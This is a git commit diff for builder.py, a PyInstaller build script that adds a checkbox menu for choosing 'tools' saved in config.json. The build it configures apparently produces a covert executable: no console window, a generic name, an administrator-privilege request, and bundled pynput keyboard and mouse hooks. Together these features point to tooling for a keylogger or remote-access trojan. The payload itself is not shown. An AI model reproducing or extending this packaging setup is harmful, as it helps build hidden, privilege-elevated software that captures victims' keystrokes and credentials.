64303e46634e23aa10d7b4af2ddddedbd6068f70
Guilherme Faccin <gfaccin27@gmail.com>
2024-09-22 12:51:36 -0300

    feat: update builder to include user configuration

--- builder.py
+++ builder.py
@@ -1,12 +1,39 @@
 import subprocess
 import os
+import json
+import inquirer
 
-def compile_main():
+def load_config():
+    if os.path.exists("config.json"):
+        with open("config.json", "r") as f:
+            return json.load(f)
+    return {}
+
+def save_config(config):
+    with open("config.json", "w") as f:
+        json.dump(config, f, indent=4)
+
+def select_options(config):
+    questions = [
+        inquirer.Checkbox('options',
+                          message="Tools:",
+                          choices=list(config.keys()),
+                          default=[key for key, value in config.items() if value]
+                          ),
+    ]
+    answers = inquirer.prompt(questions)
+    
+    for key in config.keys():
+        config[key] = key in answers['options']
+
+def compile_main(config):
     try:
         subprocess.run(["pyinstaller", "--version"], check=True, capture_output=True)
     except subprocess.CalledProcessError:
         print("PyInstaller não está instalado. Instalando...")
         subprocess.run(["pip", "install", "pyinstaller"], check=True)
+
+    save_config(config)
 
     command = [
         "pyinstaller",
@@ -14,14 +41,14 @@ def compile_main():
         "--noconsole",
         "--name=Build",
         "main.py",
-        "--add-data", "config.json;."  # Adiciona o arquivo config.json
+        "--add-data", "config.json;."
     ]
 
     command.extend([
-        "--windowed",  # msm que no console, só que mais uma validação
-        "--uac-admin",  # req admin privlgs
-        "--hidden-import=pynput.keyboard._win32",  # Importação oculta para pynput
-        "--hidden-import=pynput.mouse._win32",     # Importação oculta para pynput
+        "--windowed",
+        "--uac-admin",
+        "--hidden-import=pynput.keyboard._win32",
+        "--hidden-import=pynput.mouse._win32",
     ])
 
     try:
@@ -32,4 +59,6 @@ def compile_main():
         print(f"Erro durante a compilação: {e}")
 
 if __name__ == "__main__":
-    compile_main()
+    config = load_config()
+    select_options(config)
+    compile_main(config)
